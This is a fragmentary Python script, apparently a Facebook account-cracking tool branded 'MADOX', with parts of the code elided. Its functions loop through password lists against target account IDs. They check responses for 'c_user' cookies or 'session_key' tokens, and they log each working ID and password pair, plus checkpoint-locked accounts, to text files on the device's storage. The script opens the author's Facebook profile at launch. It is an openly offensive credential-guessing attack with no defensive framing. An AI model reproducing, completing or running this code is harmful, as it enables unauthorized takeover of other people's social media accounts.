...
os.system('xdg-open https://facebook.com/100000280997908/')
...
logo=("""\033[1;37m
.88b  d88.  .d8b.  d8888b.  .d88b.  db    db 
88'YbdP`88 d8' `8b 88  `8D .8P  Y8. `8b  d8'
88  88  88 88ooo88 88   88 88    88  `8bd8'  
88  88  88 88~~~88 88   88 88    88  .dPYb.  
88  88  88 88   88 88  .8D `8b  d8' .8P  Y8. 
YP  YP  YP YP   YP Y8888D'  `Y88P'  YP    YP 
\033[1;30mEvery expert was once a beginner\033[1;37m 
\033[1;31;1m-----------------------------------------------\x1b[1;97m
 [+]\033[1;34m Author\033[1;37m    : MADOX
 [+]\033[1;35m Github\033[1;37m    : Madox-404
 [+]\033[1;32m Tools Type\033[1;37m: PRIVATE
 [+]\033[1;31m Version\033[1;37m   :  0.0
\033[1;31;1m----------------------------------------------\x1b[1;97m""")
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [MADOX] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aking:
                                ...
                                print('\r\r\033[1;32m [MADOX-OK] %s | %s'%(ids,pas))
                                open('/sdcard/MADOX-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aking:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [MADOX-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/MADOX-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [MADOX] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/MADOX-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
...
def api1(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [MADOX-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/MADOX-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/MADOX-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [MADOX-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/MADOX-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [MADOX-OK] '+uid+' | '+pas+'\033[1;97m')
